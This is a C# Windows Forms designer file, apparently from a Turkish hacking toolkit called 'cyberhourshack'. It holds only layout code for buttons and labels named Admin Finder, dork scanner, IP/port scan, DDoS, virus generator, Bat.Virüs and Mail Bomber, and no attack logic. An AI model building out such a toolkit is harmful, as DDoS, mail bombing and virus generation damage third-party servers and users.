            this.recuperareIIButton36.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton36.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton36.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton36.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton36.Location = new System.Drawing.Point(600, 0);
            this.recuperareIIButton36.Name = "recuperareIIButton36";
            this.recuperareIIButton36.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton36.TabIndex = 29;
            this.recuperareIIButton36.Text = "TÜM ÖZELLİKLER";
            // 
            // recuperareIIButton25
            // 
            this.recuperareIIButton25.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton25.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton25.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton25.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton25.Location = new System.Drawing.Point(525, 0);
            this.recuperareIIButton25.Name = "recuperareIIButton25";
            this.recuperareIIButton25.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton25.TabIndex = 28;
            this.recuperareIIButton25.Text = "AYARLAR";
            // 
            // recuperareIIButton24
            // 
            this.recuperareIIButton24.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton24.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton24.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton24.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton24.Location = new System.Drawing.Point(450, 0);
            this.recuperareIIButton24.Name = "recuperareIIButton24";
            this.recuperareIIButton24.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton24.TabIndex = 27;
            this.recuperareIIButton24.Text = "VİRÜS ÜRET";
            this.recuperareIIButton24.Click += new System.EventHandler(this.recuperareIIButton24_Click);
            // 
            // recuperareIIButton23
            // 
            this.recuperareIIButton23.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton23.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton23.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton23.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton23.Location = new System.Drawing.Point(375, 0);
            this.recuperareIIButton23.Name = "recuperareIIButton23";
            this.recuperareIIButton23.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton23.TabIndex = 26;
            this.recuperareIIButton23.Text = "Mail Bomber";
            // 
            // recuperareIIButton22
            // 
            this.recuperareIIButton22.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton22.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton22.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton22.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton22.Location = new System.Drawing.Point(300, 0);
            this.recuperareIIButton22.Name = "recuperareIIButton22";
            this.recuperareIIButton22.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton22.TabIndex = 25;
            this.recuperareIIButton22.Text = "Ddos";
            // 
            // recuperareIIButton17
            // 
            this.recuperareIIButton17.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton17.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton17.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton17.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton17.Location = new System.Drawing.Point(225, 0);
            this.recuperareIIButton17.Name = "recuperareIIButton17";
            this.recuperareIIButton17.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton17.TabIndex = 24;
            this.recuperareIIButton17.Text = "Web Browser";
            // 
            // recuperareIIButton16
            // 
            this.recuperareIIButton16.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton16.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton16.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton16.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton16.Location = new System.Drawing.Point(150, 0);
            this.recuperareIIButton16.Name = "recuperareIIButton16";
            this.recuperareIIButton16.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton16.TabIndex = 23;
            this.recuperareIIButton16.Text = "Ip & Port ";
            // 
            // recuperareIIButton12
            // 
            this.recuperareIIButton12.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton12.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton12.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton12.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton12.Location = new System.Drawing.Point(75, 0);
            this.recuperareIIButton12.Name = "recuperareIIButton12";
            this.recuperareIIButton12.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton12.TabIndex = 22;
            this.recuperareIIButton12.Text = "Dork Tarayıcı";
            // 
            // recuperareIIButton1
            // 
            this.recuperareIIButton1.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton1.Dock = System.Windows.Forms.DockStyle.Left;
            this.recuperareIIButton1.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton1.Location = new System.Drawing.Point(0, 0);
            this.recuperareIIButton1.Name = "recuperareIIButton1";
            this.recuperareIIButton1.Size = new System.Drawing.Size(75, 41);
            this.recuperareIIButton1.TabIndex = 20;
            this.recuperareIIButton1.Text = "Admin Finder";
            this.recuperareIIButton1.Click += new System.EventHandler(this.RecuperareIIButton1_Click);
            // 
            // pictureBox10
            // 
            this.pictureBox10.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox10.Image")));
            this.pictureBox10.Location = new System.Drawing.Point(3, 3);
            this.pictureBox10.Name = "pictureBox10";
            this.pictureBox10.Size = new System.Drawing.Size(38, 35);
            this.pictureBox10.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox10.TabIndex = 21;
            this.pictureBox10.TabStop = false;
            this.pictureBox10.Click += new System.EventHandler(this.PictureBox10_Click);
            // 
            // panel8
            // 
            this.panel8.Controls.Add(this.recuperareIIButton2);
            this.panel8.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel8.Location = new System.Drawing.Point(1279, 0);
            this.panel8.Name = "panel8";
            this.panel8.Size = new System.Drawing.Size(152, 41);
            this.panel8.TabIndex = 18;
            // 
            // recuperareIIButton2
            // 
            this.recuperareIIButton2.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton2.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton2.Location = new System.Drawing.Point(3, 6);
            this.recuperareIIButton2.Name = "recuperareIIButton2";
            this.recuperareIIButton2.Size = new System.Drawing.Size(146, 30);
            this.recuperareIIButton2.TabIndex = 21;
            this.recuperareIIButton2.Text = "00:00:00";
            this.recuperareIIButton2.Click += new System.EventHandler(this.RecuperareIIButton2_Click);
            // 
            // panel7
            // 
            this.panel7.BackColor = System.Drawing.Color.White;
            this.panel7.Location = new System.Drawing.Point(47, -1);
            this.panel7.Name = "panel7";
            this.panel7.Size = new System.Drawing.Size(3, 42);
            this.panel7.TabIndex = 18;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(3, 3);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(38, 35);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 1;
            this.pictureBox1.TabStop = false;
            this.pictureBox1.Click += new System.EventHandler(this.PictureBox1_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label1.Location = new System.Drawing.Point(8, 86);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(92, 17);
            this.label1.TabIndex = 9;
            this.label1.Text = "Admin Finder";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label2.Location = new System.Drawing.Point(34, 426);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(40, 17);
            this.label2.TabIndex = 10;
            this.label2.Text = "Ddos";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label3.Location = new System.Drawing.Point(10, 170);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(90, 17);
            this.label3.TabIndex = 11;
            this.label3.Text = "Dork Tarayıcı";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label4.Location = new System.Drawing.Point(22, 501);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(63, 17);
            this.label4.TabIndex = 12;
            this.label4.Text = "Bat.Virüs";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label5.Location = new System.Drawing.Point(16, 255);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(82, 17);
            this.label5.TabIndex = 13;
            this.label5.Text = "Ip-Port Tara";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label6.Location = new System.Drawing.Point(11, 578);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(88, 17);
            this.label6.TabIndex = 14;
            this.label6.Text = "Mail-Bomber";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label7.Location = new System.Drawing.Point(28, 337);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(56, 17);
            this.label7.TabIndex = 15;
            this.label7.Text = "Tarayıcı";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label8.Location = new System.Drawing.Point(30, 655);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(52, 17);
            this.label8.TabIndex = 16;
            this.label8.Text = "Ayarlar";
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.Color.White;
            this.panel2.Controls.Add(this.textBox1);
            this.panel2.Controls.Add(this.recuperareIIButton6);
            this.panel2.Controls.Add(this.recuperareIIButton5);
            this.panel2.Controls.Add(this.recuperareIIButton4);
            this.panel2.Controls.Add(this.ambiance_Button_22);
            this.panel2.Controls.Add(this.ambiance_Button_21);
            this.panel2.Controls.Add(this.groupBox3);
            this.panel2.Controls.Add(this.groupBox2);
            this.panel2.Controls.Add(this.label11);
            this.panel2.Controls.Add(this.groupBox1);
            this.panel2.Controls.Add(this.panel6);
            this.panel2.Controls.Add(this.panel5);
            this.panel2.Controls.Add(this.panel4);
            this.panel2.Controls.Add(this.panel3);
            this.panel2.Location = new System.Drawing.Point(394, 327);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(98, 70);
            this.panel2.TabIndex = 17;
            // 
            // textBox1
            // 
            this.textBox1.BackColor = System.Drawing.Color.Transparent;
            this.textBox1.Font = new System.Drawing.Font("Tahoma", 11F);
            this.textBox1.ForeColor = System.Drawing.Color.DimGray;
            this.textBox1.Location = new System.Drawing.Point(100, 52);
            this.textBox1.MaxLength = 32767;
            this.textBox1.Multiline = false;
            this.textBox1.Name = "textBox1";
            this.textBox1.ReadOnly = false;
            this.textBox1.Size = new System.Drawing.Size(612, 28);
            this.textBox1.TabIndex = 24;
            this.textBox1.Text = "Örnek:> http://www.google.com/ başına http:// koymayı unutmayın";
            this.textBox1.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.textBox1.UseSystemPasswordChar = false;
            this.textBox1.TextChanged += new System.EventHandler(this.TextBox1_TextChanged);
            // 
            // recuperareIIButton6
            // 
            this.recuperareIIButton6.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton6.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton6.Location = new System.Drawing.Point(736, 307);
            this.recuperareIIButton6.Name = "recuperareIIButton6";
            this.recuperareIIButton6.Size = new System.Drawing.Size(169, 41);
            this.recuperareIIButton6.TabIndex = 23;
            this.recuperareIIButton6.Text = "BULUNANLARI KAYDET";
            this.recuperareIIButton6.Click += new System.EventHandler(this.RecuperareIIButton6_Click);
            // 
            // recuperareIIButton5
            // 
            this.recuperareIIButton5.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton5.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton5.Location = new System.Drawing.Point(548, 307);
            this.recuperareIIButton5.Name = "recuperareIIButton5";
            this.recuperareIIButton5.Size = new System.Drawing.Size(169, 41);
            this.recuperareIIButton5.TabIndex = 22;
            this.recuperareIIButton5.Text = "BULUNANLAR TEMİZLE";
            this.recuperareIIButton5.Click += new System.EventHandler(this.RecuperareIIButton5_Click);
            // 
            // recuperareIIButton4
            // 
            this.recuperareIIButton4.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton4.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton4.Location = new System.Drawing.Point(360, 307);
            this.recuperareIIButton4.Name = "recuperareIIButton4";
            this.recuperareIIButton4.Size = new System.Drawing.Size(169, 41);
            this.recuperareIIButton4.TabIndex = 21;
            this.recuperareIIButton4.Text = "TARAMAYI TEMİZLE";
            this.recuperareIIButton4.Click += new System.EventHandler(this.RecuperareIIButton4_Click);
            // 
            // ambiance_Button_22
            // 
            this.ambiance_Button_22.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_Button_22.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_Button_22.Image = null;
            this.ambiance_Button_22.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.ambiance_Button_22.Location = new System.Drawing.Point(835, 51);
            this.ambiance_Button_22.Name = "ambiance_Button_22";
            this.ambiance_Button_22.Size = new System.Drawing.Size(100, 30);
            this.ambiance_Button_22.TabIndex = 15;
            this.ambiance_Button_22.Text = "DURDUR";
            this.ambiance_Button_22.TextAlignment = System.Drawing.StringAlignment.Center;
            this.ambiance_Button_22.Click += new System.EventHandler(this.Ambiance_Button_22_Click);
            // 
            // ambiance_Button_21
            // 
            this.ambiance_Button_21.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_Button_21.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_Button_21.Image = null;
            this.ambiance_Button_21.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.ambiance_Button_21.Location = new System.Drawing.Point(718, 51);
            this.ambiance_Button_21.Name = "ambiance_Button_21";
            this.ambiance_Button_21.Size = new System.Drawing.Size(100, 30);
            this.ambiance_Button_21.TabIndex = 14;
            this.ambiance_Button_21.Text = "BAŞLAT";
            this.ambiance_Button_21.TextAlignment = System.Drawing.StringAlignment.Center;
            this.ambiance_Button_21.Click += new System.EventHandler(this.Ambiance_Button_21_Click);
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.listBox3);
            this.groupBox3.Location = new System.Drawing.Point(325, 356);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(615, 202);
            this.groupBox3.TabIndex = 6;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Bulunanlar";
            // 
            // listBox3
            // 
            this.listBox3.FormattingEnabled = true;
            this.listBox3.Location = new System.Drawing.Point(6, 19);
            this.listBox3.Name = "listBox3";
            this.listBox3.Size = new System.Drawing.Size(604, 173);
            this.listBox3.TabIndex = 0;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.search);
            this.groupBox2.Location = new System.Drawing.Point(325, 100);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(615, 198);
            this.groupBox2.TabIndex = 5;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Tarama";
            // 
            // search
            // 
            this.search.FormattingEnabled = true;
            this.search.Location = new System.Drawing.Point(6, 19);
            this.search.Name = "search";
            this.search.Size = new System.Drawing.Size(604, 160);
            this.search.TabIndex = 1;
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label11.Location = new System.Drawing.Point(16, 58);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(78, 17);
            this.label11.TabIndex = 10;
            this.label11.Text = "URL LİNK >";
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.ambiance_TextBox1);
            this.groupBox1.Controls.Add(this.effectualButtonBlue3);
            this.groupBox1.Controls.Add(this.listBox1);
            this.groupBox1.Location = new System.Drawing.Point(16, 100);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(303, 458);
            this.groupBox1.TabIndex = 4;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "UZANTILAR";
            // 
            // ambiance_TextBox1
            // 
            this.ambiance_TextBox1.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_TextBox1.Font = new System.Drawing.Font("Tahoma", 11F);
            this.ambiance_TextBox1.ForeColor = System.Drawing.Color.DimGray;
            this.ambiance_TextBox1.Location = new System.Drawing.Point(6, 424);
            this.ambiance_TextBox1.MaxLength = 32767;
            this.ambiance_TextBox1.Multiline = false;
            this.ambiance_TextBox1.Name = "ambiance_TextBox1";
            this.ambiance_TextBox1.ReadOnly = false;
            this.ambiance_TextBox1.Size = new System.Drawing.Size(291, 28);
            this.ambiance_TextBox1.TabIndex = 19;
            this.ambiance_TextBox1.Text = "EKLEMEK İSTEDİĞİNİZ UZANTI ";
            this.ambiance_TextBox1.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.ambiance_TextBox1.UseSystemPasswordChar = false;
            // 
            // effectualButtonBlue3
            // 
            this.effectualButtonBlue3.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue3.Location = new System.Drawing.Point(6, 393);
            this.effectualButtonBlue3.Name = "effectualButtonBlue3";
            this.effectualButtonBlue3.Size = new System.Drawing.Size(291, 28);
            this.effectualButtonBlue3.TabIndex = 18;
            this.effectualButtonBlue3.Text = "Uzantı Ekle";
            this.effectualButtonBlue3.Click += new System.EventHandler(this.EffectualButtonBlue3_Click);
            // 
            // listBox1
            // 
            this.listBox1.FormattingEnabled = true;
            this.listBox1.Location = new System.Drawing.Point(6, 19);
            this.listBox1.Name = "listBox1";
            this.listBox1.Size = new System.Drawing.Size(291, 368);
            this.listBox1.TabIndex = 0;
            this.listBox1.SelectedIndexChanged += new System.EventHandler(this.ListBox1_SelectedIndexChanged);
            // 
            // panel6
            // 
            this.panel6.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel6.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel6.Location = new System.Drawing.Point(88, 36);
            this.panel6.Name = "panel6";
            this.panel6.Size = new System.Drawing.Size(10, 24);
            this.panel6.TabIndex = 3;
            // 
            // panel5
            // 
            this.panel5.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel5.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel5.Location = new System.Drawing.Point(0, 36);
            this.panel5.Name = "panel5";
            this.panel5.Size = new System.Drawing.Size(10, 24);
            this.panel5.TabIndex = 2;
            // 
            // panel4
            // 
            this.panel4.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel4.Location = new System.Drawing.Point(0, 60);
            this.panel4.Name = "panel4";
            this.panel4.Size = new System.Drawing.Size(98, 10);
            this.panel4.TabIndex = 1;
            // 
            // panel3
            // 
            this.panel3.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel3.Controls.Add(this.label10);
            this.panel3.Controls.Add(this.button1);
            this.panel3.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel3.Location = new System.Drawing.Point(0, 0);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(98, 36);
            this.panel3.TabIndex = 0;
            this.panel3.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel3_MouseDown);
            this.panel3.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel3_MouseMove);
            this.panel3.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel3_MouseUp);
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label10.ForeColor = System.Drawing.Color.White;
            this.label10.Location = new System.Drawing.Point(401, 11);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(159, 17);
            this.label10.TabIndex = 12;
            this.label10.Text = "< Admin Panel Bulucu >";
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.ForeColor = System.Drawing.Color.White;
            this.button1.Location = new System.Drawing.Point(922, 6);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(23, 22);
            this.button1.TabIndex = 4;
            this.button1.Text = "X";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.Button1_Click);
            // 
            // Saat
            // 
            this.Saat.Enabled = true;
            this.Saat.Interval = 1000;
            this.Saat.Tick += new System.EventHandler(this.Saat_Tick);
            // 
            // pictureBox2
            // 
            this.pictureBox2.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox2.Image = global::cyberhourshack.Properties.Resources._2Iad;
            this.pictureBox2.Location = new System.Drawing.Point(30, 31);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(53, 52);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox2.TabIndex = 1;
            this.pictureBox2.TabStop = false;
            this.pictureBox2.Click += new System.EventHandler(this.PictureBox2_Click);
            // 
            // pictureBox9
            // 
            this.pictureBox9.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox9.Image = global::cyberhourshack.Properties.Resources.Zayo_Security_Icons_Proactive_DDoS_Management_Circle;
            this.pictureBox9.Location = new System.Drawing.Point(31, 369);
            this.pictureBox9.Name = "pictureBox9";
            this.pictureBox9.Size = new System.Drawing.Size(53, 52);
            this.pictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox9.TabIndex = 8;
            this.pictureBox9.TabStop = false;
            this.pictureBox9.Click += new System.EventHandler(this.PictureBox9_Click);
            // 
            // pictureBox3
            // 
            this.pictureBox3.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox3.Image = global::cyberhourshack.Properties.Resources.ayarlar_png_2;
            this.pictureBox3.Location = new System.Drawing.Point(30, 600);
            this.pictureBox3.Name = "pictureBox3";
            this.pictureBox3.Size = new System.Drawing.Size(53, 52);
            this.pictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox3.TabIndex = 2;
            this.pictureBox3.TabStop = false;
            this.pictureBox3.Click += new System.EventHandler(this.PictureBox3_Click);
            // 
            // pictureBox4
            // 
            this.pictureBox4.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox4.Image = global::cyberhourshack.Properties.Resources.internet_icon;
            this.pictureBox4.Location = new System.Drawing.Point(30, 282);
            this.pictureBox4.Name = "pictureBox4";
            this.pictureBox4.Size = new System.Drawing.Size(53, 52);
            this.pictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox4.TabIndex = 3;
            this.pictureBox4.TabStop = false;
            this.pictureBox4.Click += new System.EventHandler(this.PictureBox4_Click);
            // 
            // pictureBox8
            // 
            this.pictureBox8.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox8.Image = global::cyberhourshack.Properties.Resources.terminal;
            this.pictureBox8.Location = new System.Drawing.Point(30, 118);
            this.pictureBox8.Name = "pictureBox8";
            this.pictureBox8.Size = new System.Drawing.Size(53, 52);
            this.pictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox8.TabIndex = 7;
            this.pictureBox8.TabStop = false;
            this.pictureBox8.Click += new System.EventHandler(this.PictureBox8_Click);
            // 
            // pictureBox5
            // 
            this.pictureBox5.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox5.Image = global::cyberhourshack.Properties.Resources.mail_logo_png_1;
            this.pictureBox5.Location = new System.Drawing.Point(30, 523);
            this.pictureBox5.Name = "pictureBox5";
            this.pictureBox5.Size = new System.Drawing.Size(53, 52);
            this.pictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox5.TabIndex = 4;
            this.pictureBox5.TabStop = false;
            this.pictureBox5.Click += new System.EventHandler(this.PictureBox5_Click);
            // 
            // pictureBox6
            // 
            this.pictureBox6.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox6.Image = global::cyberhourshack.Properties.Resources._165_1653694_ip_management_service_ip_based_icon;
            this.pictureBox6.Location = new System.Drawing.Point(30, 196);
            this.pictureBox6.Name = "pictureBox6";
            this.pictureBox6.Size = new System.Drawing.Size(53, 52);
            this.pictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox6.TabIndex = 5;
            this.pictureBox6.TabStop = false;
            this.pictureBox6.Click += new System.EventHandler(this.PictureBox6_Click);
            // 
            // pictureBox7
            // 
            this.pictureBox7.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox7.Image = global::cyberhourshack.Properties.Resources._1_2_virus_free_download_png_thumb;
            this.pictureBox7.Location = new System.Drawing.Point(30, 444);
            this.pictureBox7.Name = "pictureBox7";
            this.pictureBox7.Size = new System.Drawing.Size(53, 52);
